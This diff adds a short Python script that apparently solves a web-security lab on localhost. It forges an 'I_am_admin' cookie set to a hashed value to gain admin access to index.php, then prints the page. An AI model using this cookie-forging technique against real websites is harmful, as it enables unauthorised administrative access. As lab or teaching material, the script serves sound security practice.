@@ -1,0 +1,12 @@
+#!/usr/bin/env python3
+
+import requests
+
+session = requests.Session()
+
+session.get("http://localhost:8080/index.php")
+
+session.cookies.set("I_am_admin", "b326b5062b2f0e69046810717534cb09")
+
+response = session.get('http://localhost:8080/index.php')
+print(response.text)
